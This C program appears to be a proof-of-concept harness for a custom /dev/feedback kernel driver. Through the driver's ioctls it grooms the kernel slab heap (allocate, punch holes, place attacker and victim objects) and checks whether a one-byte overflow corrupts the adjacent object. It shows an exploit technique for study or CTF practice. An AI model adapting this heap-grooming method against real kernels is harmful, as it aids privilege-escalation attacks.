#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>

#define FEEDBACK_IOCTL_CREATE 0x1337
#define FEEDBACK_IOCTL_EDIT 0x1338
#define FEEDBACK_IOCTL_GET 0x1339
#define FEEDBACK_IOCTL_DELETE 0x133A

struct feedback_ioctl_args {
    uint32_t id;
    uint32_t size;
    char *data;
};

int fd;

int create_fb(uint32_t id, uint32_t size, const char *data) {
    struct feedback_ioctl_args args = { .id = id, .size = size, .data = (char *)data };
    int ret = ioctl(fd, FEEDBACK_IOCTL_CREATE, &args);
    if (ret < 0) {
        fprintf(stderr, "[-] ioctl(CREATE, id=%u, size=%u) failed: %s\n", id, size, strerror(errno));
    }
    return ret;
}

int get_fb(uint32_t id, uint32_t size, char *data) {
    struct feedback_ioctl_args args = { .id = id, .size = size, .data = data };
    int ret = ioctl(fd, FEEDBACK_IOCTL_GET, &args);
    if (ret < 0) {
        fprintf(stderr, "[-] ioctl(GET, id=%u) failed: %s\n", id, strerror(errno));
    }
    return ret;
}

int delete_fb(uint32_t id) {
    struct feedback_ioctl_args args = { .id = id };
    int ret = ioctl(fd, FEEDBACK_IOCTL_DELETE, &args);
    if (ret < 0) {
        fprintf(stderr, "[-] ioctl(DELETE, id=%u) failed: %s\n", id, strerror(errno));
    }
    return ret;
}

#define TARGET_SLAB_SIZE 128
#define GROOM_COUNT 32
#define VICTIM_ID 1000
#define ATTACKER_ID 1001
#define NUM_TESTS 16

void run_test() {
    uint32_t groom_ids[GROOM_COUNT];
    char victim_buf[TARGET_SLAB_SIZE];
    char attacker_buf[TARGET_SLAB_SIZE - 1];
    char check_buf[TARGET_SLAB_SIZE];
    int hits = 0;

    printf("[*] Starting test run...\n");

    // 1. Fill slabs to create a predictable state
    printf("[*] Phase 1: Grooming - Allocating %d objects of size %d\n", GROOM_COUNT, TARGET_SLAB_SIZE);
    for (int i = 0; i < GROOM_COUNT; i++) {
        groom_ids[i] = i;
        if (create_fb(groom_ids[i], TARGET_SLAB_SIZE, "A") < 0) {
            return; // Abort test if groom fails
        }
    }

    // 2. Punch holes in the slab to create free slots
    printf("[*] Phase 2: Punching Holes - Freeing every other object\n");
    for (int i = 0; i < GROOM_COUNT; i += 2) {
        delete_fb(groom_ids[i]);
    }

    // 3. Place the attacker object (the one that will overflow)
    // It should land in one of the holes.
    printf("[*] Phase 3: Placing Attacker (size %zu)\n", sizeof(attacker_buf));
    memset(attacker_buf, 'B', sizeof(attacker_buf));
    if (create_fb(ATTACKER_ID, sizeof(attacker_buf), attacker_buf) < 0) {
        return;
    }

    // 4. Place the victim object.
    // The hope is that the allocator places this immediately after the attacker.
    printf("[*] Phase 4: Placing Victim (size %zu)\n", sizeof(victim_buf));
    memset(victim_buf, 'C', sizeof(victim_buf));
    if (create_fb(VICTIM_ID, sizeof(victim_buf), victim_buf) < 0) {
        delete_fb(ATTACKER_ID);
        return;
    }

    // 5. Check for corruption
    // The 1-byte overflow from the attacker should corrupt the first byte of the victim.
    printf("[*] Phase 5: Checking for corruption in victim object\n");
    memset(check_buf, 0, sizeof(check_buf));
    if (get_fb(VICTIM_ID, sizeof(check_buf), check_buf) < 0) {
        // Error getting victim, can't verify
    } else {
        if (check_buf[0] != 'C') {
            printf("[+] HIT! Victim's first byte was corrupted: 0x%02x (expected 'C')\n", (unsigned char)check_buf[0]);
            hits++;
        } else {
            printf("[-] Miss. No corruption detected.\n");
        }
    }

    // Cleanup
    printf("[*] Phase 6: Cleanup\n");
    delete_fb(ATTACKER_ID);
    delete_fb(VICTIM_ID);
    for (int i = 1; i < GROOM_COUNT; i += 2) {
        delete_fb(groom_ids[i]);
    }
    printf("[+] Test finished. Hits: %d\n", hits);
}

int main() {
    printf("[*] Waiting for /dev/feedback to become available...\n");
    struct timespec req = { .tv_sec = 0, .tv_nsec = 100000000L }; // 100ms
    int retries = 30; // Try for 3 seconds max
    while ((fd = open("/dev/feedback", O_RDWR)) < 0 && retries > 0) {
        nanosleep(&req, NULL);
        retries--;
    }

    if (fd < 0) {
        perror("[-] Failed to open device after multiple retries");
        return 1;
    }
    printf("[+] Device /dev/feedback opened successfully.\n");

    run_test();

    close(fd);
    return 0;
}
